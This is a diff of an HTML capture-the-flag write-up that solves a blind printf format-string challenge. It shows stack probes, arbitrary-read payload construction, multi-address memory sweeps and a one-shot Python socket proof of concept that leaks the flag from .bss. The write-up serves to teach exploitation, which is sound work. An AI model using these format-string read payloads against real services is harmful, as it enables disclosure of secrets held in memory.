@@ -67,25 +67,232 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p><code>nc 0.cloud.chals.io 23023</code>, no binary shipped. The description - &quot;an echo that repeats back a little more than you said&quot; - is a textbook printf format-string leak description, and the flag text (<code>bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry</code>) confirms the intent to solve entirely blind.</p>
-<p><strong>First contact:</strong> <code>%p</code>/<code>%x</code>/<code>%s</code> confirm the bug immediately; feeding <code>AAAA%p%p%p%p%p%p%p%p</code> leaks <code>0x7025702541414141</code> - our own input buffer, <button type="button" class="wu-gloss" data-def="A byte order where the least-significant byte is stored first.">little-endian</button>, living on the stack, at argument index 6 (8-byte words). An 8-byte-aligned sweep maps the stack layout and finds several <strong>fixed, non-randomised</strong> low addresses (<code>0x40xxxx</code>/<code>0x48xxxx</code>/<code>0x4bxxxx</code>), proving the binary is <strong>static, non-PIE</strong> - fixed global addresses are readable without any <button type="button" class="wu-gloss" data-def="Address Space Layout Randomization: randomizes memory addresses each run to make exploits harder to write reliably.">ASLR</button> leak.</p>
-<p><strong>Arbitrary read:</strong> naively placing the target address first fails because <code>printf</code> treats the buffer as a C string and stops at the first <code>0x00</code> byte inside the packed address. Fix: place the address <strong>after</strong> the format specifiers, computing the correct argument index from the buffer offset (<code>IDX = 6 + OFF//8</code>). Verified against known strings (<code>&quot;quit&quot;</code>, a known banner string).</p>
-<p>Two interaction quirks: the service drops the <strong>leading character</strong> of every line (so avoid relying on it), and it processes <strong>exactly one line per TCP segment</strong> (extra pipelined lines in one <code>send()</code> are discarded) - requests must be sent one line at a time.</p>
-<p><strong>Speeding up:</strong> printf accepts many positional specifiers in one format string, so one request reads ~30 addresses via <code>%38$s|%39$s|...</code>, giving ~15 ms per address and letting whole memory regions be swept in seconds.</p>
-<p><strong>Locating the flag:</strong> <code>flag.txt</code>&#39;s name sits in <code>.rodata</code>; the file is read into a fixed <code>.bss</code> buffer at startup. Sweeping <code>.bss</code> with stride 8 finds the flag string directly, confirmed by reading neighbouring (empty/NUL) addresses to pin the exact start:</p>
-<figure class="wu-code wu-code-output" data-lines="2">
+<h2 id="1-prompt-analysis"><a class="wu-anchor" href="#1-prompt-analysis" aria-hidden="true">#</a>1. Prompt analysis</h2>
+<p>Description:</p>
+<blockquote>
+<p>&quot;An echo that repeats back a little more than you said.&quot;
+<code>nc 0.cloud.chals.io 23023</code></p>
+</blockquote>
+<p>The phrase &quot;repeats back a <strong>little more</strong> than you said&quot; is a textbook
+description of a <strong>printf format-string leak</strong>: the service takes your input
+and hands it straight to <code>printf()</code> <strong>as the format string</strong>, so <code>%p</code> / <code>%s</code>
+make it print <em>extra</em> (uninitialised stack, memory at pointers).</p>
+<p>No binary was shipped. The flag text itself (<code>bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry</code>)
+confirms the intent: solve it <strong>blind</strong>, no <code>checksec</code>, no disassembly.</p>
+<h2 id="2-first-contact"><a class="wu-anchor" href="#2-first-contact" aria-hidden="true">#</a>2. First contact</h2>
+<figure class="wu-code wu-code-output" data-lines="3">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
         <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-1"><code class="language-text">4b6ac0  isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}
-isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}</code></pre>
+      <pre id="code-1"><code class="language-text">$ printf 'hello\n' | nc 0.cloud.chals.io 23023
+&gt; hello
+&gt;</code></pre>
       
-    </figure><p>No write primitives (<code>%n</code>) were ever needed - the flag is simply leaked out of a global via the arbitrary read. Lessons: blind format-string work proceeds via <code>%p</code> stack mapping then identifying non-randomised addresses to prove static/non-PIE; NUL bytes kill a format string unless the pointer comes <em>after</em> the specifiers; multi-specifier reads turn a 1-read-per-RTT <button type="button" class="wu-gloss" data-def="In an exploit, anything that answers a single yes/no question about hidden state, one query at a time.">oracle</button> into a ~30-read-per-RTT scanner.</p>
+    </figure><p>Banner is literally just the prompt <code>&quot;&gt; &quot;</code>. Every line is echoed back.</p>
+<p>Feeding format specifiers immediately confirms the bug:</p>
+<figure class="wu-code wu-code-output" data-lines="5">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">$ %p              -&gt; 0x48725b
+$ %x %x %x        -&gt; 48725b 0 71
+$ %s              -&gt; quit
+$ AAAA%p%p%p%p%p%p%p%p
+      -&gt; AAAA0x48725b(nil)0x71(nil)(nil)0x7025702541414141 0x7025702570257025 0x70257025</code></pre>
+      
+    </figure><p><code>0x7025702541414141</code> is <button type="button" class="wu-gloss" data-def="A byte order where the least-significant byte is stored first.">little-endian</button> <code>&quot;AAAA%p%p&quot;</code> - <strong>our own input buffer,
+which lives on the stack</strong>. The repeating <code>0x70257025…</code> words are the
+<code>%p</code> pattern repeating. Conclusion: classic stack-based format string, our
+buffer starts at <strong>argument index 6</strong> (8-byte words).</p>
+<p>An 8-byte-aligned sweep (<code>AAAAAAAA.%p.%p...</code>) revealed the memory layout:</p>
+<figure class="wu-code wu-code-output" data-lines="6">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">idx 1  = 0x48725b            -&gt; %s gives &quot;quit&quot;
+idx 2  = (nil)
+idx 3  = 0x71
+idx 6..= our buffer bytes
+idx 39 = 0x7ffe....           stack pointer
+...    0x40xxxx / 0x487xxx / 0x489xxx / 0x4b5140   &lt;- low, FIXED addresses</code></pre>
+      
+    </figure><p>The <code>0x40…</code>/<code>0x48…</code>/<code>0x4b…</code> addresses are <strong>not randomised</strong> → the binary is a
+<strong>static, non-PIE</strong> executable (statically linked glibc - later reads showed
+buffers flags <code>0xfbad2887</code>, i.e. <code>_IO_2_1_stdout_</code>, and libc paths like
+<code>/sysdeps/x86/dl-cacheinfo.h</code>). That means fixed global addresses are readable
+without any <button type="button" class="wu-gloss" data-def="Address Space Layout Randomization: randomizes memory addresses each run to make exploits harder to write reliably.">ASLR</button> leak.</p>
+<h2 id="3-building-a-working-arbitrary-read"><a class="wu-anchor" href="#3-building-a-working-arbitrary-read" aria-hidden="true">#</a>3. Building a working arbitrary read</h2>
+<p>Naively placing the target address <strong>first</strong> fails:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">payload = p64(addr) + &quot;%6$s&quot;
+-&gt; prints only the first bytes of addr, e.g. &quot;[rH&quot;</code></pre>
+      
+    </figure><p>Reason: <code>p64(0x48725b)</code> = <code>5b 72 48 00 00 00 00 00</code>. printf reads the buffer as
+a <strong>C string</strong>, so it stops at the first <code>0x00</code> and never reaches <code>%6$s</code>.</p>
+<p><strong>Fix:</strong> put the address <strong>after</strong> the format specifiers. The buffer starts at
+argument index 6, so a pointer placed at buffer offset <code>OFF</code> is argument index
+<code>6 + OFF/8</code>.</p>
+<figure class="wu-code" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">OFF      = <span class="hljs-number">64</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">IDX      = <span class="hljs-number">6</span> + OFF//<span class="hljs-number">8</span>          <span class="hljs-comment"># 14</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">fmt      = <span class="hljs-string">b&quot;%14$s&quot;</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">payload  = fmt + <span class="hljs-string">b&quot;B&quot;</span>*(OFF-<span class="hljs-built_in">len</span>(fmt)) + p64(addr)</span></span></code></pre>
+      
+    </figure><p>Verified against known data:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">0x48725b  -&gt; &quot;quit&quot;
+0x489448  -&gt; &quot;[chall] mirage on 127.0.0.1:%d\n&quot;</code></pre>
+      
+    </figure><p>Arbitrary C-string read confirmed.</p>
+<h3 id="quirk-leading-character-is-dropped"><a class="wu-anchor" href="#quirk-leading-character-is-dropped" aria-hidden="true">#</a>Quirk: leading character is dropped</h3>
+<p>In the multi-reader we noticed the first byte of the payload never appears in
+the output - the service effectively calls <code>printf(buf+1)</code> (or otherwise eats
+the leading char). All argument indices are unaffected (they depend on buffer
+position, not the format-string start), so we simply don&#39;t rely on the first
+byte.</p>
+<h3 id="quirk-one-line-per-tcp-segment"><a class="wu-anchor" href="#quirk-one-line-per-tcp-segment" aria-hidden="true">#</a>Quirk: one line per TCP segment</h3>
+<p>The server reads with a single <code>read()</code> and only processes the <strong>first line</strong> of
+a chunk; extra lines pipelined in the same <code>send()</code> are discarded:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-text">send 6 lines at once  -&gt;  only 1 response + prompt</code></pre>
+      
+    </figure><p>So requests must be sent <strong>one line at a time</strong> and the prompt awaited.</p>
+<h2 id="4-speeding-up-multi-string-read"><a class="wu-anchor" href="#4-speeding-up-multi-string-read" aria-hidden="true">#</a>4. Speeding up - multi-string read</h2>
+<p>printf accepts many positional specifiers in one format string, so one request
+can read many addresses at once. Pointers are parked at buffer offset 256 →
+argument indices 38, 39, 40, …:</p>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">OFF, BASE_IDX = <span class="hljs-number">256</span>, <span class="hljs-number">6</span> + OFF//<span class="hljs-number">8</span>        <span class="hljs-comment"># 38</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">fmt  = <span class="hljs-string">b&quot;|&quot;</span>.join(<span class="hljs-string">b&quot;%%%d$s&quot;</span>%(BASE_IDX+i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)) + <span class="hljs-string">b&quot;|&quot;</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">payload = fmt + <span class="hljs-string">b&quot;Z&quot;</span>*(OFF-<span class="hljs-built_in">len</span>(fmt)) + <span class="hljs-string">b&quot;&quot;</span>.join(p64(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> addrs)</span></span></code></pre>
+      
+    </figure><p>Response is <code>s0|s1|...|s_{n-1}|</code> followed by the padding and raw address bytes.
+Result: <strong>~30 addresses per round trip, ~15 ms per address</strong> - enough to sweep
+whole memory regions in seconds.</p>
+<h2 id="5-locating-the-flag"><a class="wu-anchor" href="#5-locating-the-flag" aria-hidden="true">#</a>5. Locating the flag</h2>
+<p><code>flag.txt</code> is opened by the program at startup - its name sits in the binary&#39;s
+own <code>.rodata</code>:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-9"><code class="language-text">0x487258  &quot;&gt; &quot;        (the prompt)
+0x487260  &quot;flag.txt&quot;</code></pre>
+      
+    </figure><p>The file is read into a <strong>fixed global buffer in .bss</strong>. Sweeping <code>.bss</code>
+(<code>0x4b5000</code> - <code>0x4b7000</code>, stride 8) found it:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-10" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-10"><code class="language-text">4b6ac0  isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}
+4b6ac8  1nd_f0rmat_str1ng_h4s_n0_b1n4ry}
+...</code></pre>
+      
+    </figure><p>Direct re-read of neighbouring addresses (<code>0x4b6ab0</code>/<code>0x4b6ab8</code> are empty /
+NUL) pins the string start exactly at <code>0x4b6ac0</code>:</p>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-11" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-11"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">reads([<span class="hljs-number">0x4b6ab0</span>, <span class="hljs-number">0x4b6ab8</span>, <span class="hljs-number">0x4b6ac0</span>, <span class="hljs-number">0x4b6ac8</span>])</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-comment"># [b&#x27;&#x27;, b&#x27;&#x27;, b&#x27;isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}&#x27;,</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment">#  b&#x27;1nd_f0rmat_str1ng_h4s_n0_b1n4ry}&#x27;]</span></span></span></code></pre>
+      
+    </figure><p>Write primitives (<code>%n</code>) were never needed - the flag is simply <strong>leaked out of
+a global</strong> through the arbitrary read.</p>
+<h2 id="6-answer"><a class="wu-anchor" href="#6-answer" aria-hidden="true">#</a>6. Answer</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-12" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-12"><code class="language-text">isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}</code></pre>
+      
+    </figure><h2 id="7-reproduction"><a class="wu-anchor" href="#7-reproduction" aria-hidden="true">#</a>7. Reproduction</h2>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-13" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-13"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">cd</span> ~/Downloads/ctfs/CRYOVAULT/mirage</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">python3 -c <span class="hljs-string">&quot;from multi import reads; print(reads([0x4b6ac0]))&quot;</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># [b&#x27;isfcr{bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry}&#x27;]</span></span></span></code></pre>
+      
+    </figure><p>Minimal one-shot PoC (single request, no tooling):</p>
+<figure class="wu-code wu-code-output" data-lines="8">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-14" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-14"><code class="language-text">python3 - &lt;&lt;'PY'
+import socket,struct,time
+s=socket.create_connection((&quot;0.cloud.chals.io&quot;,23023)); s.settimeout(8)
+time.sleep(1); s.recv(4096)
+OFF=64; IDX=6+OFF//8; fmt=b&quot;%&quot; + str(IDX).encode() + b&quot;$s&quot;
+s.sendall(fmt+b&quot;B&quot;*(OFF-len(fmt))+struct.pack(&quot;&lt;Q&quot;,0x4b6ac0)+b&quot;\n&quot;)
+print(s.recv(4096).split(b&quot;B&quot;)[0])
+PY</code></pre>
+      
+    </figure><h2 id="8-lessons-gotchas"><a class="wu-anchor" href="#8-lessons-gotchas" aria-hidden="true">#</a>8. Lessons / gotchas</h2>
+<ol>
+<li><strong>No binary ≠ no solve.</strong> Blind format-string work: <code>%p</code> to map the stack,
+then identify non-randomised addresses to prove static/non-PIE.</li>
+<li><strong>NUL bytes kill a format string.</strong> Always place binary addresses <em>after</em> the
+specifiers; the format string is a C string.</li>
+<li><strong>Multi-specifier reads</strong> (<code>%38$s%39$s...</code>) turn a 1-read-per-RTT <button type="button" class="wu-gloss" data-def="In an exploit, anything that answers a single yes/no question about hidden state, one query at a time.">oracle</button> into
+a ~30-read-per-RTT scanner.</li>
+<li><strong>Interaction quirks matter</strong>: here the server processes exactly <strong>one line
+per TCP segment</strong> and appears to drop the <strong>leading character</strong> of the line.</li>
+<li>The flag itself was the hint: <code>bl1nd_f0rmat_str1ng_h4s_n0_b1n4ry</code>.</li>
+</ol>
 
     </article>
-    
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#1-prompt-analysis">1. Prompt analysis</a></li><li><a href="#2-first-contact">2. First contact</a></li><li><a href="#3-building-a-working-arbitrary-read">3. Building a working arbitrary read</a><ol class="wu-toc-sub"><li><a href="#quirk-leading-character-is-dropped">Quirk: leading character is dropped</a></li><li><a href="#quirk-one-line-per-tcp-segment">Quirk: one line per TCP segment</a></li></ol></li><li><a href="#4-speeding-up-multi-string-read">4. Speeding up - multi-string read</a></li><li><a href="#5-locating-the-flag">5. Locating the flag</a></li><li><a href="#6-answer">6. Answer</a></li><li><a href="#7-reproduction">7. Reproduction</a></li><li><a href="#8-lessons-gotchas">8. Lessons / gotchas</a></li></ol>
+      </nav>
   </div>
 
   <nav class="wu-pager" aria-label="More writeups">
